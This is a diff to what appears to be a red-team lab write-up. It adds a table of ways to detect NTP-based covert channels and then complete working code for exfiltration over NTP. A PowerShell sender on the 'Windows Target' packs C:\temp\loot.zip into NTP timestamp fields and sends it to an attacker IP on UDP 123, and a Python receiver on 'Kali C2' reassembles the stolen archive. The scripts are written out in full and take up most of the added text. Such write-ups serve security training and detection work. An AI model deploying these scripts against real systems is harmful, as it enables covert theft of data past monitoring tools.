@@ -230,9 +230,75 @@ Standard network monitoring and DLP (Data Loss Prevention) solutions primarily i
 
 <img width="449" height="73" alt="image" src="https://github.com/user-attachments/assets/d5df3463-262a-496c-a45f-b3f60f34d7ee" />
 
+
 <img width="300" height="242" alt="image" src="https://github.com/user-attachments/assets/b82b295c-828f-44ed-a70b-0bc13623d96c" />
 
+
 <img width="519" height="165" alt="image" src="https://github.com/user-attachments/assets/b5c537a0-b8a4-4b5c-835d-fb6e40f57227" />
+
+
+| Detection Vector | Description |
+|:---|:---|
+| **Process-to-port correlation** | Legitimate NTP traffic originates from `svchost.exe` (Windows Time Service). `powershell.exe` making outbound UDP 123 connections is anomalous to EDR tools. |
+| **Destination IP** | Real NTP traffic goes to known time servers (pool.ntp.org, time.windows.com). Traffic to an unknown internal or external IP on port 123 would be flagged. |
+| **Beaconing pattern** | Legitimate NTP syncs every 64-1024 seconds as a single packet exchange. A stream of 48-byte UDP 123 packets is significantly different in volume and frequency. |
+| **Timestamp field entropy** | Real NTP timestamp fields contain time values with low entropy. Analysis of the timestamp fields would reveal high-entropy binary data inconsistent with time values. |
+
+**Implementation:**
+Receiver Script (Kali C2)
+```python
+# NTP Covert Channel - Receiver
+# Validates NTP packet structure and extracts data from timestamp fields
+# Reassembles chunks into loot.zip upon receiving EOF signal
+import socket
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind(('0.0.0.0', 123))
+s.settimeout(30)
+data = bytearray()
+ 
+while True:
+    try:
+        packet, addr = s.recvfrom(48)
+        if len(packet) != 48:
+            continue
+        if packet[0] != 0x1B:
+            continue
+        chunk = packet[16:48]
+        if chunk[:3] == b'EOF':
+            break
+        data.extend(chunk)
+    except socket.timeout:
+        break
+ 
+open('/home/kali/loot/loot.zip', 'wb').write(data)
+```
+Sender Script (Windows Target)
+```powershell
+# NTP Covert Channel - Sender
+# Encodes loot.zip into valid NTP packet timestamp fields
+$file = [System.IO.File]::ReadAllBytes("C:\temp\loot.zip")
+$client = New-Object System.Net.Sockets.UdpClient
+$client.Connect("192.168.92.136", 123)
+ 
+for ($i = 0; $i -lt $file.Length; $i += 32) {
+    $ntp = New-Object byte[] 48
+    $ntp[0] = 0x1B
+    $ntp[1] = 0x01
+    $ntp[2] = 0x06
+    $ntp[3] = 0xEC
+    $chunk = $file[$i..[Math]::Min($i+31, $file.Length-1)]
+    [Array]::Copy($chunk, 0, $ntp, 16, $chunk.Length)
+    $client.Send($ntp, 48) | Out-Null
+    Start-Sleep -Milliseconds 10
+}
+ 
+$eof = New-Object byte[] 48
+$eof[0] = 0x1B
+[Array]::Copy([System.Text.Encoding]::ASCII.GetBytes("EOF"), 0, $eof, 16, 3)
+$client.Send($eof, 48) | Out-Null
+$client.Close()
+```
 
 ### Phase 4: Privilege Escalation
 **Vulnerability:** CVE-2023-XXXXX (Hypothetical Print Spooler Flaw)
